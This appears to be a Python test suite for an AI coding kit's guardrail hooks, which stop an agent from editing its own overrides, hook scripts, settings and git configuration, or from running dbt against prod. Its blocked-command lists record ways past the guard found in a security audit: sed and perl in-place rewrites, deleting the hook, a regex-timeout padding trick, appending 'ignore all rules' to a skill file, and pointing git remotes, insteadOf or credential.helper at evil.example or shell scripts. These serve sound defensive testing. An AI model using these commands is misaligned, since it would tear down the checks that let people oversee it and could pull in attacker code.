"""0.41: the protected-paths guardrail allows a command that names a protected path only when every program it runs reads.
Each case below came from the security audit of 0.40, where it got through."""
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import unittest

HOOK = Path(__file__).resolve().parents[1]/'runtime'/'hooks'/'protected-paths.py'


class Base(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.home = Path(temp.name)

    def decide(self, payload, cwd=None):
        env = {**os.environ, 'HOME': str(self.home), 'USERPROFILE': str(self.home)}
        proc = subprocess.run([sys.executable, '-I', str(HOOK)], input=json.dumps(payload), capture_output=True, text=True,
                              encoding='utf-8', env=env, cwd=cwd or str(self.home), timeout=30)
        out = json.loads(proc.stdout or '{}')
        return out.get('decision') or (out.get('hookSpecificOutput') or {}).get('permissionDecision')

    def shell(self, command, tool='Bash'):
        return self.decide({'tool_name': tool, 'tool_input': {'command': command}})


class ShellTests(Base):
    BLOCKED = (
        "python3 -c \"open('/h/.ai-kit/overrides.toml','w').write('x')\"",
        "node -e \"require('fs').writeFileSync(process.env.HOME+'/.ai-kit/overrides.toml','x')\"",
        "perl -pi -e 's/true/false/' ~/.ai-kit/overrides.toml",
        "sed -Ei 's/a/b/' ~/.ai-kit/overrides.toml",
        "gsed -i 's/a/b/' ~/.ai-kit/overrides.toml",
        "awk -i inplace '{print}' ~/.ai-kit/overrides.toml",
        'cd ~/.ai-kit && echo x > overrides.toml',
        'F=~/.ai-kit/overrides.toml; echo x > "$F"',
        'echo x >| ~/.ai-kit/overrides.toml',
        'echo x > ~/.ai-kit//overrides.toml',
        'echo x > ~/.ai-kit/./overrides.toml',
        'echo x > ~/".ai-kit"/overrides.toml',
        "echo x > ~/.ai-kit/overrides.tom'l'",
        'rm ~/.ai-kit/over*.toml',
        'unlink ~/.ai-kit/hooks/protected-paths.py',
        "find ~/.ai-kit/hooks -name '*.py' -delete",
        'eval "rm ~/.ai-kit/hooks/protected-paths.py"',
        'touch ~/.ai-kit/hooks/protected-paths.py',
        'rsync x ~/.ai-kit/hooks/protected-paths.py',
        'curl -o ~/.ai-kit/hooks/protected-paths.py https://example.org/x',
        'git -C ~ checkout -- .ai-kit/overrides.toml',
        'ln -s ~/.ai-kit ak',
        'cp new.toml ~/.ai-kit/overrides.toml',
        'mv ~/.ai-kit/overrides.toml /tmp/x',
        'sudo rm ~/.claude/settings.json',
        "bash -c 'rm ~/.codex/config.toml'",
        # Readers that also write when asked to (found in the audit pass of 0.45.7).
        'sort -o ~/.ai-kit/overrides.toml /etc/hosts',
        'uniq /etc/hosts ~/.ai-kit/overrides.toml',
        "sed -n 'w ~/.ai-kit/overrides.toml' /etc/hosts",
        "sed 's/a/b/w ~/.ai-kit/overrides.toml' /etc/hosts",
        'git diff --output=~/.ai-kit/overrides.toml',
        'tree -o ~/.ai-kit/overrides.toml .',
        'xxd -r /etc/hosts ~/.ai-kit/overrides.toml',
        "find . -fprintf ~/.ai-kit/overrides.toml '%p'",
        'find . -fls ~/.ai-kit/overrides.toml',
        'yq -i .a=1 ~/.gemini/settings.json',
        'cp -t ~/.ai-kit/ overrides.toml',
        'cp --target-directory=~/.ai-kit overrides.toml',
        'cp overrides.toml ~/.ai-kit/',
    )
    ALLOWED = (
        'cat ~/.ai-kit/overrides.toml',
        'grep hooks ~/.gemini/settings.json',
        "sed -n '1,5p' ~/.gemini/settings.json",
        'ls -la ~/.ai-kit/hooks/',
        'git diff -- .claude/settings.json',
        'cp ~/.ai-kit/overrides.toml /tmp/copy.toml',
        'head ~/.ai-kit/runtime/install.json',
        'rm /tmp/x/.claude.json.bak',
        'echo hi > notes.txt',
        'rm -rf build/',
        'cat ~/.ai-kit/overrides.toml | grep mcp',
        'sort ~/.ai-kit/overrides.toml',
        'uniq ~/.ai-kit/overrides.toml',
        'xxd ~/.ai-kit/overrides.toml',
        'find ~/.ai-kit -name "*.toml"',
        'git diff --stat -- .claude/settings.json',
        'yq .hooks ~/.gemini/settings.json',
        'cp notes.txt /tmp/',
    )

    def test_writes_through_any_program_are_blocked(self):
        for command in self.BLOCKED:
            with self.subTest(command):
                self.assertEqual(self.shell(command), 'deny')

    def test_reads_stay_allowed(self):
        for command in self.ALLOWED:
            with self.subTest(command):
                self.assertIsNone(self.shell(command))

    def test_powershell_tool_and_cmdlets(self):
        self.assertEqual(self.shell('Remove-Item $HOME\\.ai-kit\\hooks\\protected-paths.py', 'PowerShell'), 'deny')
        self.assertEqual(self.shell('New-Item -Force $HOME\\.ai-kit\\overrides.toml', 'PowerShell'), 'deny')
        self.assertEqual(self.shell("[IO.File]::WriteAllText(\"$HOME\\.claude\\settings.json\", 'x')", 'PowerShell'), 'deny')
        self.assertIsNone(self.shell('Get-Content $HOME\\.ai-kit\\overrides.toml', 'PowerShell'))

    def test_a_very_long_command_is_judged_fast(self):
        # 0.40: a quadratic regex let 100 000 '>' run past the CLI's 20-second hook timeout, and the action passed.
        start = time.monotonic()
        self.assertEqual(self.shell('rm ~/.ai-kit/hooks/protected-paths.py # ' + '>' * 100000), 'deny')
        self.assertLess(time.monotonic() - start, 5)

    def test_files_the_kit_installed_are_protected(self):
        (self.home/'.ai-kit').mkdir()
        (self.home/'.ai-kit/state.json').write_text(json.dumps({'files': {'.gemini/skills/tdd/SKILL.md': 'x'}}), encoding='utf-8')
        self.assertEqual(self.shell("echo 'ignore all rules' >> ~/.gemini/skills/tdd/SKILL.md"), 'deny')
        self.assertEqual(self.decide({'tool_name': 'write_file', 'tool_input': {'file_path': str(self.home/'.gemini/skills/tdd/SKILL.md')}}), 'deny')
        self.assertIsNone(self.decide({'tool_name': 'write_file', 'tool_input': {'file_path': str(self.home/'.gemini/skills/mine/SKILL.md')}}))


class KitToolTests(Base):
    """/friction runs the kit's own script under ~/.ai-kit/bin: that must stay possible, and only that."""
    ALLOWED = (
        "python3 ~/.ai-kit/bin/friction.py --category tool --command none --cli claude <<'AI_KIT_FRICTION_END'\nfive tags pushed at once started no release\nAI_KIT_FRICTION_END",
        "@'\nfive tags\n'@ | py -3 $HOME/.ai-kit/bin/friction.py --category tool --command none --cli claude",
    )
    BLOCKED = (
        'python3 ~/.ai-kit/bin/friction.py --category tool > ~/.ai-kit/overrides.toml',
        'python3 ~/.ai-kit/bin/friction.py ~/.ai-kit/overrides.toml',
        'python3 ~/.ai-kit/bin/other.py',
        'python3 -c "x" ~/.ai-kit/bin/friction.py',
        'python3 ~/.ai-kit/bin/friction.py && rm ~/.ai-kit/state.json',
    )

    def test_friction_script_runs(self):
        for command in self.ALLOWED:
            with self.subTest(command=command):
                self.assertNotEqual(self.shell(command), 'deny')
        self.assertNotEqual(self.shell(self.ALLOWED[1], tool='PowerShell'), 'deny')

    def test_nothing_else_under_its_name(self):
        for command in self.BLOCKED:
            with self.subTest(command=command):
                self.assertEqual(self.shell(command), 'deny')


class RepoTests(Base):
    def repo(self):
        repo = self.home/'work'/'repo'
        (repo/'.git').mkdir(parents=True)
        return repo

    def test_repo_settings_that_turn_hooks_off_are_protected(self):
        repo = self.repo()
        for rel in ('.claude/settings.local.json', '.claude/settings.json', '.gemini/settings.json', '.codex/config.toml'):
            with self.subTest(rel):
                self.assertEqual(self.decide({'tool_name': 'Write', 'tool_input': {'file_path': str(repo/rel), 'content': '{}'}}, str(repo)), 'deny')

    def test_a_dotenv_setting_the_kit_variables_is_refused(self):
        repo = self.repo()
        write = lambda content: self.decide({'tool_name': 'Write', 'tool_input': {'file_path': str(repo/'.env'), 'content': content}}, str(repo))
        self.assertEqual(write('AI_KIT_PROD_TARGETS=none\n'), 'deny')
        self.assertEqual(write('export DBT_TARGET=prod\n'), 'deny')
        self.assertIsNone(write('DATABASE_URL=postgres://localhost/dev\n'))

    def test_the_repo_is_found_from_the_file_not_the_launch_folder(self):
        # 0.40: a file of a repo was protected only when the CLI was started inside that repo.
        repo = self.repo()
        (repo/'.ai-kit').mkdir()
        (repo/'.ai-kit/protected-paths').write_text('target/**\n/models/legacy/**\n', encoding='utf-8')
        elsewhere = self.home/'elsewhere'
        elsewhere.mkdir()
        self.assertEqual(self.decide({'tool_name': 'Write', 'tool_input': {'file_path': str(repo/'target/x.sql')}}, str(elsewhere)), 'deny')
        # A leading / anchors at the repo root, as in .gitignore (0.40 never applied it).
        self.assertEqual(self.decide({'tool_name': 'Write', 'tool_input': {'file_path': str(repo/'models/legacy/a.sql')}}, str(repo)), 'deny')


class KitCommandTests(Base):
    """0.52.0: the agent could run every ai-kit subcommand (only two scripts were exempted by path; a bare command name was never
    seen). The ones that change the installation or bill a model call are refused in the agent's shell; reading ones stay."""
    REFUSED = ('ai-kit setup --profile general', 'ai-kit update', 'ai-kit uninstall --yes', 'ai-kit new skill --name demo',
               'ai-kit doctor --live', 'ai-kit friction --mode auto --yes', 'python3 -m ai_kit uninstall --yes', 'py -m ai_kit update',
               'python -I -m installer setup --profile general', '~/.ai-kit/bin/ai-kit update', 'cd /tmp && ai-kit update',
               'sh scripts/bootstrap.sh update', 'Installer.cmd uninstall', 'ai-kit --yes uninstall',
               # 2.0.0: sending frictions is the person's approval, never the agent's
               'ai-kit friction --sync', 'python3 ~/.ai-kit/bin/friction.py --sync')
    ALLOWED = ('ai-kit doctor', 'ai-kit usage --since 30', 'ai-kit news --later', 'ai-kit news --list', 'ai-kit --version',
               'ai-kit friction --category docs --text x', 'ai-kit friction --list', 'ai-kit friction --mode',
               'ai-kit managed-settings --out /tmp/managed', 'echo run ai-kit update yourself', 'grep -r "ai-kit update" docs')

    def test_writing_and_billed_subcommands_are_refused(self):
        for command in self.REFUSED:
            with self.subTest(command):
                self.assertEqual(self.shell(command), 'deny')

    def test_reading_subcommands_stay_allowed(self):
        for command in self.ALLOWED:
            with self.subTest(command):
                self.assertIsNone(self.shell(command))


class McpToolTests(Base):
    def test_an_mcp_write_tool_is_judged_like_a_write(self):
        # 0.51.1 (V1-SEC-04): Claude Code now sends MCP tools to the guardrail; the script must refuse their protected writes.
        target = str(self.home/'.ai-kit'/'overrides.toml')
        self.assertEqual(self.decide({'tool_name': 'mcp__files__write_file', 'tool_input': {'path': target, 'content': 'x'}}), 'deny')
        self.assertEqual(self.decide({'tool_name': 'mcp__files__edit_file', 'tool_input': {'path': target, 'edits': []}}), 'deny')
        self.assertIsNone(self.decide({'tool_name': 'mcp__files__read_file', 'tool_input': {'path': target}}))
        self.assertIsNone(self.decide({'tool_name': 'mcp__files__write_file', 'tool_input': {'path': str(self.home/'notes.md'), 'content': 'x'}}))


class KitCloneTests(Base):
    """0.51.1 (V1-SEC-02): the kit folder an installation came from (state.json kit_dir) is the source of the next update and
    of the session hook's remote read; ~/.gitconfig can redirect or run what git does there. Rule X6: the clone's .git/config
    and .git/hooks are always protected; the rest of the clone when the session starts outside it (a maintainer works on the
    kit with an agent inside the clone)."""
    def setUp(self):
        super().setUp()
        self.kit = self.home/'apps'/'ai-toolkit'
        (self.kit/'.git'/'hooks').mkdir(parents=True)
        (self.home/'.ai-kit').mkdir()
        (self.home/'.ai-kit'/'state.json').write_text(json.dumps({'kit_dir': str(self.kit), 'files': {}}), encoding='utf-8')
        self.other = self.home/'work'/'repo'
        (self.other/'.git').mkdir(parents=True)

    def write(self, path, cwd):
        return self.decide({'tool_name': 'Write', 'tool_input': {'file_path': str(path), 'content': 'x'}, 'cwd': str(cwd)}, str(cwd))

    def run_in(self, command, cwd):
        return self.decide({'tool_name': 'Bash', 'tool_input': {'command': command}, 'cwd': str(cwd)}, str(cwd))

    def test_from_another_repo_the_clone_is_protected(self):
        for rel in ('organization.toml', 'runtime/hooks/protected-paths.py', 'practices/10-company.md', '.git/config'):
            with self.subTest(rel):
                self.assertEqual(self.write(self.kit/rel, self.other), 'deny')
        for command in (f'git -C {self.kit} remote set-url origin https://evil.example/x.git',
                        f'echo locked_hooks=[] > {self.kit}/organization.toml',
                        f'cd {self.kit} && git config core.fsmonitor /tmp/x',
                        f'sed -i s/a/b/ {self.kit}/runtime/hooks/protected-paths.py'):
            with self.subTest(command):
                self.assertEqual(self.run_in(command, self.other), 'deny')

    def test_inside_the_clone_its_git_config_stays_protected(self):
        self.assertEqual(self.write(self.kit/'.git'/'config', self.kit), 'deny')
        self.assertEqual(self.write(self.kit/'.git'/'hooks'/'pre-commit', self.kit), 'deny')
        for command in ('git remote set-url origin https://evil.example/x.git', 'git remote add evil https://evil.example/x.git',
                        'git config core.fsmonitor /tmp/x', 'git config --local core.hooksPath /tmp/h', 'echo x >> .git/config'):
            with self.subTest(command):
                self.assertEqual(self.run_in(command, self.kit), 'deny')

    def test_a_maintainer_still_works_on_the_kit_inside_its_clone(self):
        self.assertIsNone(self.write(self.kit/'skills'/'internal'/'common'/'demo'/'SKILL.md', self.kit))
        self.assertIsNone(self.write(self.kit/'organization.toml', self.kit))
        for command in ('git status', 'git log --oneline -3', 'git diff', 'cat .git/config', 'git config --get remote.origin.url'):
            with self.subTest(command):
                self.assertIsNone(self.run_in(command, self.kit))

    def test_reads_of_the_clone_and_other_repos_stay_allowed(self):
        for command in (f'cat {self.kit}/.git/config', f'cat {self.kit}/organization.toml', f'grep -r tdd {self.kit}/skills',
                        f'git -C {self.other} remote set-url origin https://gitlab.example.org/x.git'):
            with self.subTest(command):
                self.assertIsNone(self.run_in(command, self.other))
        sibling = self.home/'apps'/'ai-toolkit-fix'  # starts with the clone's path, but is another folder
        self.assertIsNone(self.write(sibling/'organization.toml', self.other))
        self.assertIsNone(self.run_in(f'echo x > {sibling}/notes.md', self.other))

    def test_gitconfig_keys_that_redirect_or_run_are_protected(self):
        self.assertEqual(self.write(self.home/'.gitconfig', self.other), 'deny')
        self.assertEqual(self.write(self.home/'.config'/'git'/'config', self.other), 'deny')
        for command in ('git config --global url.https://evil.example/.insteadOf https://gitlab.example.org/',
                        'git config --global core.fsmonitor /tmp/x', 'git config --global credential.helper "!sh /tmp/x"',
                        'git config --global --add include.path /tmp/x', 'git config --system core.hooksPath /tmp/h',
                        'git config --global -e', 'echo "[core]" >> ~/.gitconfig'):
            with self.subTest(command):
                self.assertEqual(self.run_in(command, self.other), 'deny')
        for command in ('git config --global user.email a@example.org', 'git config --global --get url.x.insteadof',
                        'git config --global --list', 'cat ~/.gitconfig'):
            with self.subTest(command):
                self.assertIsNone(self.run_in(command, self.other))


DBT = Path(__file__).resolve().parents[1]/'runtime'/'hooks'/'dbt-prod-guard.py'


class DbtTests(unittest.TestCase):
    def decide(self, command, env=None, cwd=None):
        proc = subprocess.run([sys.executable, '-I', str(DBT)], capture_output=True, text=True, encoding='utf-8',
                              input=json.dumps({'tool_name': 'Bash', 'tool_input': {'command': command}, 'cwd': cwd or os.getcwd()}),
                              env={**os.environ, 'AI_KIT_ALLOW_PROD': '', 'DBT_TARGET': '', **(env or {})})
        return 'deny' if 'deny' in proc.stdout else None

    def test_cases_that_got_through_in_0_40(self):
        self.assertEqual(self.decide('dbt run --target prod', {'AI_KIT_PROD_TARGETS': 'none'}), 'deny')  # a .env cannot remove targets
        self.assertEqual(self.decide('dbt run', {'DBT_TARGET': 'prod'}), 'deny')
        self.assertEqual(self.decide("d''bt run --target pr\\od"), 'deny')
        self.assertEqual(self.decide("python -c \"from dbt.cli.main import dbtRunner; dbtRunner().invoke(['run', '--target', 'prod'])\""), 'deny')
        self.assertEqual(self.decide('dbt run --target eu_live', {'AI_KIT_PROD_TARGETS': 'eu_live'}), 'deny')  # extra targets add

    def test_a_jinja_default_target_in_profiles_is_read(self):
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, 'profiles.yml').write_text("p:\n  target: \"{{ env_var('DBT_TARGET', 'prod') }}\"\n", encoding='utf-8')
            self.assertEqual(self.decide('dbt run', cwd=tmp), 'deny')
            self.assertIsNone(self.decide('dbt run', {'DBT_TARGET': 'dev'}, cwd=tmp))

    def test_development_and_mentions_stay_allowed(self):
        for command in ('dbt run --target dev', 'grep dbt README.md', 'dbt test -t dev'):
            with self.subTest(command):
                self.assertIsNone(self.decide(command))


if __name__ == '__main__':
    unittest.main()
